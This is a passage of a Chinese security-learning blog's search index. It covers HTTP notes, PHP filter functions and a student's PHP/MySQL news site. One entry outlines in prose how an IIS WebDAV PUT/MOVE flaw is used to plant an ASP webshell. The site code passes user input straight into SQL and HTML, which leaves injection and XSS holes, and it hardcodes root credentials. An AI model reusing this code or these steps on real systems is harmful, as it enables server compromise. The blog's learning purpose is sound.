<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Welcome]]></title>
    <url>%2F2019%2F08%2F21%2Fwelcome%2F</url>
    <content type="text"><![CDATA[]]></content>
  </entry>
  <entry>
    <title><![CDATA[practice8]]></title>
    <url>%2F2019%2F08%2F20%2Fpractice8%2F</url>
    <content type="text"><![CDATA[Abstract: HTTP 协议和 HTTPS协议的异同点， HTTP 协议中常见头部字段信息的含义及 IIS PUT写权限漏洞学习报告。 描述 HTTP 协议和 HTTPS 协议的异同点 相同点：HTTP 和 HTTPS 都采用同一个基础的协议。HTTPS并非是一种新协议，只是HTTP通信接口部分用SSL和TLS协议代替而已。HTTPS就是身披SSL协议外壳的HTTP。 不同点 名称 不同点 安全性 HTTP不安全，HTTPS安全；HTTP无需证书，无需加密，HTTPS需要证书需要加密 端口号 HTTP标准端口是80，HTTPS是443 所处层 HTTP工作与应用层，HTTPS工作与传输层 URL HTTP以http://开头，HTTPS以https://开头 通信 HTTP直接和TCP通信，HTTPS写和SSL通信，再由SSL和TCP通信。 参考文献 HTTP和HTTPS异同点 《图解HTTP》 描述 HTTP 协议中，常见头部字段信息含义。 请求首部字段 请求首部字段 含义 Accept 通知服务器，用户能够处理的媒体类型及媒体类型的相对优先级。 Accept-Charset 通知服务器用户代理支持的字符集及字符集的相对优先顺序。 Authorization 告知服务器，用户代理的认证信息。 Expect 告知服务器，期望出现的某种特定行为。 From 告知服务器使用用户代理的电子邮件地址。 Host 告知服务器，请求资源所处的互联网的主机名和端口号。 Proxy-Authorization 告知服务器认证所需要的信息。 Range 告知服务器资源的指定范围。 Referer 告知服务器请求的原始资源的URI User-Agent 将创建请求的浏览器和用户代理名称等信息传达给服务器。 响应首部字段 响应首部字段 含义 Accept-Ranges 告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。 Age 告知客户端，源服务器在多久前创建了响应。 ETag 告知客户端实体标识。 Location 响应接收方引导至某个与请求URI位置不同的资源。 Proxy-Authenticate 由代理服务器所要求的认证信息发送给客户端。 Retry-After 告知客户端应该在多久之后再次发送请求。 Server 告知客户端当前服务器上安装的HTTP服务器应用程序的信息。 Vary 可对缓存进行控制。 WWW-Authenticate 用于HTTP访问认证。 IIS put 写权限漏洞 打开VMware虚拟机，先查看 IP 地址 ​ 主机访问网站 ​ WebDAV 开启之前 ​ 使用 burpsuite 抓取数据包，将 GET 方法改为 OPTIONS 后， ​ 开启 WebDAV 服务， ​ 使用 burpsuite 抓取数据包，将 GET 方法改为 OPTIONS 后， ​ 文件所在文件夹的写权限未开启前 ​ 使用 PUT 写入文件 ​ 文件所在文件夹的写权限开启 ​ 使用 PUT 写入文件 ​ 进入目录查看，可以找到 test.txt 文件 ​ 先将一句话木马写入 test.txt 中 ​ 查看 test.txt ​ 将 脚本资源访问 打上勾 ​ 在用 MOVE 将 test.txt 修改为 test.asp ​ 查看 test.asp]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note26]]></title>
    <url>%2F2019%2F08%2F20%2Fnote26%2F</url>
    <content type="text"><![CDATA[Abstract: 针对 HTTP的协议基础进行了简单的学习，掌握 HTTP 相关内容， 安装 burpsuite 软件，熟练使用该软件。对 PDO模式下防止 SQL 注入的理解。 HTTP协议基础一、计算机网络模型基础OSI 模型总共分为七层，从下到上分别是：物理层、数据链路层、网络层、运输层、会话层、表示层和应用层。 TCP/IP 模型分为五层，从下到上是：物理层、链路层、网络层、运输层和应用层。 OSI模型和 TCP/IP 模型 OSI 模型 TCP/IP 模型 各层的解释 应用层 应用层 为应用程序提供服务 表示层 应用层 数据格式转化、数据加密 会话层 应用层 建立、管理和维护会话 传输层 传输层 建立、管理和维护端到端的连接 网络层 网络层 IP 选址及路由选择 数据链路层 数据链路层 提供介质访问和链路管理 物理层 物理层 物理层 过程如下： 应用层数据，先按照运输层协议标准，封装到运输层数据里（数据段）； 接着运输层的数据，会按照网络层协议的标准，封装到网络层数据里（数据包/报文）； 接着这些数据包会按照链路层的协议标准，封装链路层数据里（帧）； 这些数据帧，按照物理层的电气特性，转换为网络中 0101比特流发送出去 网络会把这些流数据，不断地拆封再拆封，直到送到目标主机，然后由目标主机一层一层拆封数据，进行反解析，最终完成一次数据传递。 层数 作用 物理层 规定电气特性。如调制解调器、光导纤维等 数据链路层 有 ARQ 、PPP等协议，数据单元为帧，典型设备有：网卡/网桥/交换机 网络层 有IP/ICMP等协议，数据单元为数据包，典型设备为：路由器/防火墙/多层交换机 传输层 有TCP/UDP等协议，数据单元为数据段，典型设备有：进程和端口 应用层 有DHCP/FTP/HTTP等协议，典型设备有：应用程序(FTP/SMTP/HTTP) 越往高走，越偏向软件化。 二、HTTP协议HTTP 协议是超文本传输（转移）协议，基于 TCP/IP 通信协议来传递数据，是一个属于应用层的面向对象的协议。 常用状态码 状态码 意义 200 OK 从客户端发来的请求在服务器端被正常处理 204 No Content 服务器接收的请求已成功处理，但在返回响应报文中不含实体的主体部分 301 Moved Permanently 永久性重定向 302 Found 临时性重定向 304 Not Modified 客户端发送附带条件请求时，服务器端允许请求访问资源，但未满足条件的情况 400 Bad Request 请求报文中存在语法错误 403 Forbidden 对请求资源的访问被服务器拒绝 404 Not Found 服务器上无法找到请求的资源 500 Internal Server Error 服务器端在执行请求时发生了错误 三、BurpSuite使用burpsuite抓取新闻管理系统的数据包 新闻初始界面 点击 forward 点击用户界面 注册成功后，登录 评论 读取新闻 进入个人信息页面 PDO模式下防止SQL注入使用 PDO 的 prepare 方式，主要是提高 SQL 模板查询性能、阻止 SQL 注入。]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP内置过滤函数]]></title>
    <url>%2F2019%2F08%2F17%2Fphp-file-func%2F</url>
    <content type="text"><![CDATA[Abstract: 本周写的新闻管理系统未对用户输入做出相应的判断，存在大量的漏洞，这篇文章特地总结了php内置过滤函数。 一、SQL注入过滤函数1. addslashes()定义和用法 addslashes(string)函数返回在预定义的字符前添加反斜杠的字符串。 预定义字符是： 单引号(‘) 双引号(“) 反斜杠() NULL 参数 描述 string 必需。规定要转移的字符串。 1234567&lt;?php $id=$_GET["id"]; $str = addslashes($id); echo $str;?&gt; 2. mysql_escape_string() 在PHP5.3中已经弃用mysql_escape_string() mysql_escape_string()并不转义%和_ 1234567&lt;?php $id=$_GET["id"];@$str = mysql_escape_string($id);echo $str;?&gt; 3. mysql_real_escape_string()定义和用法 mysql_real_escape_string(str, con)函数转义SQL语句中使用的字符串中的特殊字符。 受影响的字符： \x00 \n \r \ ‘ “ \x1a 若成功，返回被转义的字符串，否则，返回false。 参数 描述 string 必需。规定要转义的字符串。 connection 可选。规定MySQL连接。未规定，则使用上一个连接。 123456789&lt;?php$id=$_GET["id"];if(@$str = mysql_real_escape_string($id)) echo $str;else echo 'false';?&gt; 二、XSS过滤函数1. htmlspecialchars()定义和用法 htmlspecialchars()函数把预定义的字符转换成HTML实体。 1234567&lt;?php$id=$_GET["id"];$str = htmlspecialchars($id);echo $str;?&gt; 参数 描述 string 必需。规定要转义的字符串。 2. strip_tag()函数定义和用法 strip_tags(string, allow) 函数剥去字符串中的HTML、XML 以及PHP的标签。 参数 描述 string 必需。规定要检查的字符串。 allow 可选。规定允许的标签。这些标签不会被删除。 1234567&lt;?php$id=$_GET["id"];$str = strip_tags($id);echo $str;?&gt; 三、命令执行过滤函数1. escapeshellcmd()定义和用法 在Windows下过滤方式是在字符前面加上一个^符号；在Linux是在字符前加上反斜杠（\） 1234567&lt;?php$id=$_GET["id"];$str = escapeshellcmd($id);echo $str;?&gt; 2. escapeshellarg()定义和用法 给所有参数加上一对双引号，强制为字符串。 1234567&lt;?php$id=$_GET["id"];$str = escapeshellarg($id);echo $str;?&gt; 参考博文]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note25]]></title>
    <url>%2F2019%2F08%2F17%2Fnote25%2F</url>
    <content type="text"><![CDATA[Abstract: 修改新闻管理系统注册用户功能，添加没有勾选免责协议时要提示，必须勾选后才能注册成功，点击免责协议可以展示协议内容，继续修改点赞功能，展示新闻管理系统，介绍思路。 一、注册功能12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091&lt;?phpRequire_once &apos;../basedir/header.php&apos;;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head &gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;br&gt;&lt;hr&gt;&lt;br&gt;&lt;br&gt;&lt;div style=&quot;width:100%;text-align:center&quot;&gt; &lt;tr&gt; &lt;h1&gt;注册&lt;/h1&gt; &lt;form action=&quot;logup.php&quot; method=&quot;post&quot; onsubmit=&quot;checkEmpty()&quot; onchange=&quot;checkSelect()&quot;&gt; &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;idName&quot; placeholder=&quot;用户名&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;passwd&quot; id=&quot;idPwd&quot; placeholder=&quot;密码&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;passwdagain&quot; id=&quot;idPwdAg&quot; placeholder=&quot;再次输入密码&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&quot;./agree.php&quot; target=&quot;_blank&quot;&gt;&lt;input type=&quot;checkbox&quot; name=&quot;agree&quot; id=&quot;idAgree&quot;&gt;已阅读并同意《免责声明》&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;提交&quot;&gt;&lt;/p&gt; &lt;/form&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align=&quot;right&quot;&gt; &lt;a href=&quot;/login.php&quot;&gt;&lt;button align=&quot;right&quot;&gt;用户登录&lt;/button&gt;&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt;&lt;/div&gt;&lt;script&gt; function checkEmpty()&#123; var name = document.getElementById(&apos;idName&apos;).value; var pwd = document.getElementById(&apos;idPwd&apos;).value; var pwdAg = document.getElementById(&apos;idPwdAg&apos;).value; var agree = document.getElementById(&apos;idAgree&apos;).checked; if(!(name &amp;&amp; pwd &amp;&amp; pwdAg))&#123; alert(&apos;所有输入框内容不能为空！&apos;); return; &#125;else &#123; if (pwd != pwdAg) &#123; alert(&apos;两次输入密码不一致！请重新输入密码！&apos;); return; &#125;else&#123; if(!agree)&#123; alert(&quot;请阅读完免责协议并勾选同意！&quot;); return; &#125; &#125; &#125; return agree; &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpRequire_once &apos;../basedir/footer.php&apos;;?&gt;&lt;?phperror_reporting(E_ALL^E_NOTICE);Require_once &quot;sql.php&quot;;$agree = $_POST[&apos;agree&apos;];$uname = base64_encode($_POST[&apos;name&apos;]);$upass = md5($_POST[&apos;passwd&apos;]);$passAgain = md5($_POST[&apos;passwdagain&apos;]);if ($uname &amp;&amp; $upass &amp;&amp; $passAgain) &#123; $checkName = mysql_query(&quot;SELECT * FROM `tb_users` where `username` = &apos;$uname&apos;;&quot;); while (@$row = mysql_fetch_array($checkName))//转成数组，且返回第一条数据,当不是一个对象时候退出 &#123; echo &quot;&lt;br&gt;&quot;; if ($uname == $row[&apos;username&apos;]) &#123; echo &quot;&lt;script&gt;alert(&apos;用户名已存在，请重新输入！&apos;);&lt;/script&gt;&quot;; die(); &#125; &#125; if ($upass==$passAgain &amp;&amp; $agree==&apos;on&apos;) &#123; echo $result = mysql_query(&quot;INSERT INTO `tb_users` (`username`, `password`) VALUES(&apos;$uname&apos;, &apos;$upass&apos;);&quot;); if (mysql_affected_rows()) &#123; echo &quot;&lt;script&gt;alert(&apos;恭喜你注册成功！即将跳转到登录页面！&apos;); location.href=&apos;login.php&apos;&lt;/script&gt;&quot;; &#125; &#125;&#125;?&gt; 二、问题与总结程序设计问题：点赞功能实现思路：点击按钮触发事件，进入后台处理页面，对数据库里面的type进行修改，统计出type的总和即热度；访问量的统计，每次从数据库读信息把view加1然后保存到数据库里面。 程序架构问题：层次不清，目录比较混乱。 团队合作问题：合作之前关于变量取名，程序处理结构均未沟通好，导致一些程序写好后合并程序时还要做修改。 漏洞问题：未对用户输入做相应的处理，存在SQL注入、XSS等漏洞。]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>MySQL</tag>
        <tag>新闻管理系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note24]]></title>
    <url>%2F2019%2F08%2F17%2Fnote24%2F</url>
    <content type="text"><![CDATA[Abstract: 新闻管理系统新闻展示页面、个人信息、找回密码以及点赞功能编写。 一、新闻展示页面 show_news.php12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;html&gt;&lt;head&gt; &lt;title&gt; 新闻展示界面 &lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $hot = 0; $title = 0; $author = 0; $view = 0; $time = 0; $content = 0; @$id= $_GET[&apos;id&apos;]; $hostname = &apos;127.0.0.1&apos;; $username = &apos;root&apos;; $passwd = &apos;root&apos;; if($id)&#123; @$con = mysql_connect(&apos;127.0.0.1&apos;, &apos;root&apos;,&apos;root&apos;) or die(mysql_error()); @mysql_select_db(&quot;lianxi&quot;) or die(mysql_error()); mysql_query(&quot;set names &apos;utf8&apos;&quot;) or die(mysql_error()); $sql = &quot;SELECT * FROM `tb_news` WHERE `id`=&apos;$id&apos;&quot;; $result = mysql_query($sql) or die(mysql_error()); for($i=0; $i&lt;mysql_affected_rows(); $i++)&#123; $arr = mysql_fetch_assoc($result); if($arr[&apos;id&apos;] == $id)&#123; $hot=$arr[&apos;hot&apos;]; $title = base64_decode($arr[&apos;title&apos;]); $author = base64_decode($arr[&apos;author&apos;]); $view = $arr[&apos;view&apos;]; $time = $arr[&apos;add_time&apos;]; $content = base64_decode($arr[&apos;contents&apos;]); break; &#125; &#125; &#125; echo &quot;&lt;h1 align=&apos;center&apos;&gt;$title&lt;/h1&gt;&quot;; echo &quot;&lt;div style=&apos;float: left&apos;&gt;&lt;label&gt;作者： $author&lt;/label&gt;&lt;label&gt; &amp;nbsp 时间：$time&lt;/label&gt;&lt;/div&gt;&quot;; echo &quot;&lt;div style=&apos;float: right&apos;&gt;&lt;label&gt;热度： $hot&lt;/label&gt; &lt;label&gt; / 浏览量：$view&lt;/label&gt;&lt;/div&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;hr&gt;&quot;; echo &quot;&lt;p align=&apos;center&apos;&gt;$content&lt;/p&gt;&quot;; echo &quot;&lt;hr&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &lt;&lt;&lt;EOF &lt;div align=&quot;center&quot;&gt; &lt;form action=&quot;newAddnews.php&quot;, mathod=&quot;post&quot;&gt; &lt;textarea rows=&apos;10&apos; cols=&apos;100&apos; style=&quot;resize: none&quot;&gt;&lt;/textarea&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;suubmit&quot; value=&quot;提交&quot;&gt; &lt;/form&gt; &lt;/div&gt;EOF; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;h4 align=&apos;center&apos;&gt;评论&lt;/h4&gt;&quot;; echo &quot;&lt;br&gt;&quot;; if($id) &#123; @$con = mysql_connect(&apos;127.0.0.1&apos;, &apos;root&apos;, &apos;root&apos;) or die(mysql_error()); @mysql_select_db(&quot;lianxi&quot;) or die(mysql_error()); mysql_query(&quot;set names &apos;utf8&apos;&quot;) or die(mysql_error()); $sql = &quot;SELECT * FROM `tb_discuss` WHERE `new_id`=&apos;$id&apos;&quot;; $result = mysql_query($sql) or die(mysql_error()); for ($i = 0; $i &lt; mysql_affected_rows(); $i++) &#123; $arr1 = mysql_fetch_assoc($result); $discussUser = base64_decode($arr1[&apos;discuss_user&apos;]); $time = $arr1[&apos;discuss_time&apos;]; $discussContent = $arr1[&quot;discuss_content&quot;]; echo &quot;&lt;hr style=\&quot;border:1px dashed #000; height:1px\&quot;&gt;&quot;; echo &quot;&lt;p align=&apos;center&apos;&gt;用户：$discussUser&quot; . &quot; 时间：$time&lt;/p&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;p align=&apos;center&apos;&gt;$discussContent&lt;/p&gt;&quot;; echo &quot;&lt;hr style=\&quot;border:1px dashed #000; height:1px\&quot;&gt;&quot;; &#125; mysql_close($con); &#125; ?&gt;&lt;/body&gt;&lt;/html&gt; 二、个人信息1. personal_information.php1234567891011121314151617181920212223242526272829303132333435&lt;?php Require_once &apos;../basedir/header.php&apos;; ?&gt;&lt;?phpsession_start();error_reporting(E_ALL^E_NOTICE);if(!isset($_SESSION[&apos;username&apos;]))&#123; echo &quot;&lt;script&gt;alert(&apos;请登录后查看！&apos;);location.href=&apos;login.php&apos;;&lt;/script&gt;&quot;;&#125;?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt; 个人资料 &lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;div style=&quot;margin: 0px 600px 0px 600px&quot;&gt; &lt;form action=&quot;personal_informationhoutai.php&quot; method=&quot;post&quot; enctype= &quot;multipart/form-data&quot;&gt; 头像：&lt;input type=&quot;file&quot; name=&quot;addr&quot;/&gt;&lt;br&gt;&lt;br&gt; 邮箱：&lt;input type=&quot;email&quot; name=&quot;email&quot;/&gt;&lt;br&gt;&lt;br&gt; 性别：&lt;input type=&quot;radio&quot; name=&quot;sexnan&quot;/&gt;男 &lt;input type=&quot;radio&quot; name=&quot;sexnv&quot;/&gt;女&lt;br&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;/&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpRequire_once &apos;../basedir/footer.php&apos;;?&gt; 2. personal_information_backstage.php12345678910111213141516171819202122232425262728293031323334&lt;?phpRequire_once &quot;sql.php&quot;;session_start();error_reporting(E_ALL^E_NOTICE);$username = $_SESSION[&apos;username&apos;];$sql = &quot;SELECT * FROM `tb_users` WHERE `username`=&apos;$username&apos;;&quot;;echo &quot;&lt;br&gt;&quot;;$row = mysql_query($sql);$row = mysql_fetch_assoc($row);echo &quot;&lt;br&gt;&quot;;$path = $row[&apos;addr&apos;];//var_dump($path);echo &quot;&lt;br&gt;&quot;;//将文件从临时文件中转移到文件保存路径var_dump(move_uploaded_file($_FILES[&apos;addr&apos;][&apos;tmp_name&apos;], $path));$email= $_POST[&apos;email&apos;]; if($_POST[&apos;sexmale&apos;])&#123; $sex = 1; &#125; if($_POST[&apos;sexfemale&apos;])&#123; $sex = -1; &#125;var_dump($_SESSION[&apos;username&apos;]);//var_dump($sex);$yuju = &quot;UPDATE `tb_users` SET email=&apos;&#123;$email&#125;&apos;,sex=&apos;$sex&apos; WHERE `username` = &apos;$_SESSION[&apos;username&apos;]&apos;;&quot;;//echo $path;$row= mysql_query(&quot;&#123;$path&#125;&quot;);?&gt; 三、找回密码1.find_passwd.php123456789101112131415161718192021222324252627282930313233&lt;?phpRequire_once &apos;../basedir/header.php&apos;;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head &gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;h2 align=&quot;center&quot;&gt;找回密码&lt;/h2&gt;&lt;br&gt;&lt;!--text-align:center;--&gt;&lt;div style=&quot;text-align:center;&quot;&gt; &lt;tr&gt; &lt;form action=&quot;findPasswdhoutai.php&quot; method=&quot;post&quot; onsubmit=&quot;checkpass()&quot; onchange=&quot;checkanswer()&quot;&gt; &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;name&quot; placeholder=&quot;输入要找回密码的用户名&quot; style=&quot;height: 20px;width: 200px&quot;&gt;&lt;/p&gt; &lt;p&gt;问题：你的爱好是？&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;answer&quot; id=&quot;inanswer&quot; placeholder=&quot;答案&quot; style=&quot;height: 20px;width: 200px&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;passwd&quot; id=&quot;passFirst&quot; placeholder=&quot;新密码&quot; style=&quot;height: 20px;width: 200px&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;passwdagain&quot; id=&quot;passSecond&quot; placeholder=&quot;再次输入密码&quot; style=&quot;height: 20px;width: 200px&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;提交&quot;&gt;&lt;/p&gt; &lt;/form&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align=&quot;right&quot;&gt; &lt;/td&gt; &lt;/tr&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpRequire_once &apos;../basedir/footer.php&apos;;?&gt; 2.find_passwd_backstage.php12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpRequire_once &quot;sql.php&quot;;//需要修改！error_reporting(E_ALL^E_NOTICE);$username = $_POST[&apos;name&apos;];var_dump($username);// $username = &apos;root&apos;;//删除用户$sql = &quot;SELECT * FROM `tb_anquan` WHERE `username`=&apos;$username&apos;;&quot;;echo $sql;$result = mysql_query($sql) or die(mysql_error());$arr = mysql_fetch_assoc($result);$answer = $arr[&apos;mima&apos;];//echo $answer;//$inAnswer = $_POST[&apos;answer&apos;];if($answer != $_POST[&apos;answer&apos;])&#123; die(&quot;&lt;script&gt;alert(&apos;密保答案不正确！&apos;);&lt;/script&gt;&quot;);&#125;$passFirst = $_POST[&apos;passwd&apos;];$passSecond = $_POST[&apos;passwdagain&apos;];if($passFirst==NULL &amp;&amp; $passSecond==NULL) &#123; die(&quot;&lt;script&gt;alert(&apos;请输入密码！&apos;);&lt;/script&gt;&quot;);&#125;else&#123; if($passFirst != $passSecond)&#123; die(&quot;&lt;script&gt;alert(&apos;输入密码不一致，请重新输入！&apos;);&lt;/script&gt;&quot;); &#125;else &#123; $passFirst = md5($passFirst); $sql = &quot;UPDATE `tb_users` SET `password`= &apos;$passFirst&apos; WHERE `username`=&apos;$username&apos;;&quot;; echo $sql; $result = mysql_query($sql) or die(mysql_error()); if (mysql_affected_rows()) &#123; echo &quot;&lt;script&gt;alert(&apos;更新成功！&apos;);location.href=&apos;login.php&apos;;&lt;/script&gt;&quot;; &#125; else &#123; die(&quot;&lt;script&gt;alert(&apos;更新失败！&apos;);location.href=&apos;findPasswd.php&apos;;&lt;/script&gt;&quot;); &#125; &#125;&#125;?&gt; 四、点赞功能up_down.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114&lt;html&gt;&lt;style &gt; .th&#123; vertical-align: middle; &#125; &lt;script type=&quot;text/javascript&quot; src=&quot;../js/jquery-1.12.4.js&quot;&gt;&lt;/script&gt;&lt;?php Require_once &quot;sql.php&quot;;?&gt;&lt;/style&gt;&lt;div style=&quot;width:100%;text-align:center&quot;&gt; &lt;h1&gt;新闻界面&lt;/h1&gt;&lt;/div&gt;&lt;table align=&quot;center&quot; border=&quot;1&quot; width=&quot;1200&quot;&gt; &lt;tr&gt; &lt;th&gt; &lt;h2&gt;热度&lt;/h2&gt; &lt;/th&gt; &lt;th&gt; &lt;h2&gt;标题&lt;/h2&gt; &lt;/th&gt; &lt;th&gt; &lt;h2&gt;作者&lt;/h2&gt; &lt;/th&gt; &lt;th&gt; &lt;h2&gt;时间&lt;/h2&gt; &lt;/th&gt; &lt;th width=&quot;150px&quot;&gt; &lt;h2&gt;操作&lt;/h2&gt; &lt;/th&gt; &lt;/tr&gt;&lt;?php//$uers_id = $_SESSION[&quot;user_id&quot;];$user_id=13;$storeUidType = array();$result = mysql_query(&quot;select * from tb_news order by hot desc;&quot;);//======================================================================================$readNews = mysql_query(&quot;select * from `tb_hot` where `user_id`=$user_id&quot;);//把用户对新闻的评价保存在一个数组里//$storeUidType[news_id] = typewhile($arr1 = mysql_fetch_assoc($readNews)) &#123; $hotUser_id = $arr1[&apos;user_id&apos;]; $hotNews_id = $arr1[&apos;news_id&apos;]; $hotType = $arr1[&apos;type&apos;]; $storeUidType[$hotNews_id] = $hotType;&#125;//echo $storeUidType;//======================================================================================while($arr = mysql_fetch_assoc($result))&#123; $title = base64_decode($arr[&apos;title&apos;]); //var_dump($title); $contents = base64_decode($arr[&apos;contents&apos;]); $author = base64_decode($arr[&apos;author&apos;]); $new_img = $arr[&apos;new_img&apos;]; $add_time = $arr[&apos;add_time&apos;]; $Hot = $arr[&apos;hot&apos;]; //读取新闻ID $id = $arr[&apos;id&apos;]; //============================================= //用户还没有对新闻进行评价，颜色设置成黑色 if($storeUidType[$id]==1)&#123; $upColor = &quot;red&quot;; $downColor = &quot;black&quot;; &#125;elseif($storeUidType[$id]==-1)&#123; $upColor = &quot;black&quot;; $downColor = &quot;red&quot;; &#125;else&#123; $upColor = &quot;black&quot;; $downColor = &quot;black&quot;; &#125; //============================================= $idUp = &apos;btnUp&apos; . $id; $idDown = &apos;btnDown&apos; . $id; $tu = base64_decode($new_img); echo &lt;&lt;&lt;EOF &lt;tr&gt; &lt;td align=&quot;center&quot;&gt;&#123;$Hot&#125;&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;&#123;$title&#125;&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;&#123;$author&#125;&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;&#123;$add_time&#125;&lt;/td&gt; &lt;td align=&quot;center&quot; rowspan=&quot;2&quot;&gt; &lt;p&gt; &lt;button id=$idUp style=&apos;color: $upColor&apos; onclick=&apos;btnUpAct(this.id)&apos;&gt;赞&lt;/button&gt;/ &lt;button id=$idDown style=&apos;color: $downColor&apos; onclick=&apos;btnDownAct(this.id)&apos;&gt;踩&lt;/button&gt; &lt;/p&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align=&quot;center&quot; height: 30px; width: 300px; text-align: center;&gt; &lt;img height=&quot;150px&quot; src=&#123;$tu&#125;&gt; &lt;/td&gt; &lt;td colspan=&quot;3&quot; align=&quot;center&quot; &gt;&lt;a href=&quot;xinwenzhanshimore.php?action=&#123;$title&#125;&quot;&gt;&#123;$contents&#125;&lt;/a&gt; &lt;/tr&gt; &lt;script&gt; function btnUpAct(id)&#123; if(id==&apos;$idUp&apos;)&#123; if(document.getElementById(id).style.color == &quot;red&quot;)&#123; alert(&apos;您已点过赞了！&apos;); &#125;else&#123; document.getElementById(id).style.color=&quot;red&quot;; document.getElementById(&apos;$idDown&apos;).style.color=&quot;black&quot;; &#125; &#125; &#125; function btnDownAct(id)&#123; if(id==&apos;$idDown&apos;)&#123; if(document.getElementById(id).style.color == &quot;red&quot;)&#123; alert(&apos;您已点过踩了！&apos;); &#125;else&#123; document.getElementById(id).style.color=&quot;red&quot;; document.getElementById(&apos;$idUp&apos;).style.color=&quot;black&quot;; &#125; &#125; &#125; &lt;/script&gt;EOF; ?&gt;&lt;/table&gt;&lt;/html&gt; 五、问题与总结新闻展示、个人信息、找回密码三个功能均可完美实现。点赞功能还是有些问题，从数据库中读取数据，新闻展示界面把该用户对每条新闻的赞踩显示出红色，在按钮添加事件，当颜色为红色时，再次点击该按钮会提示已操作过。用这种思路写出来，只是最后一条新闻功能实现是正确，后来查资料得知，js事件用于循环时只对最后一条有作用，需用闭包解决。需换思路！]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>MySQL</tag>
        <tag>新闻管理系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note23]]></title>
    <url>%2F2019%2F08%2F16%2Fnote23%2F</url>
    <content type="text"><![CDATA[Abstract: 用PHP操作MySQL数据库 一、常用函数 函数名称 作用 mysql_connect(host, uname, passwd) 进行数据库连接 mysql_select_db(‘database’) 选择数据库 mysql_query(sql) 向数据库发送指令 mysql_fetch_array() 获取数据集中一行数据 mysql_fetch_row() 获取数字索引数组 mysql_fetch_assoc() 获取关联索引数组 二、循环遍历查询结果1. whilesql.php 12345678&lt;?php $host = '127.0.0.1'; $username = 'root'; $password = 'root'; @$con = mysql_connect($host, $username, $password) or die(mysql_error()); mysql_select_db('test') or die(mysql_error()); mysql_query('set names "utf8"') or die(mysql_error());?&gt; 12345678910&lt;?php include 'sql.php'; $sql = "SELECT * FROM `content`;"; $result = mysql_query($sql); while($arr = mysql_fetch_assoc($result))&#123; $title = $arr['title']; $author = $arr['author']; echo $author. '-&gt;' . $title; &#125;?&gt; 2. for1234567891011&lt;?php include 'sql.php'; $sql = "SELECT * FROM `content`;"; $result = mysql_query($sql); for($i=0; $i&lt;mysql_affected_rows(); $i++)&#123; $arr = mysql_fetch_assoc($result); $title = $arr['title']; $author = $arr['author']; echo $author. '-&gt;' . $title; &#125;?&gt; 三、对密码的处理123456789101112131415161718192021222324252627&lt;?php session_start(); //若$_SESSION['uname']为空则跳转到登录页面 if(!$_SESSION('uname'))&#123; header("Location: login.php"); die(); &#125; @$old_pass = $_POST['old_pass']; @$new_pass = $_POST['new_pass']; @$new_pass_again = $_POST['new_pass_again']; if($old_pass &amp;&amp; $new_pass &amp;&amp; $new_pass_again)&#123; if($new_pass 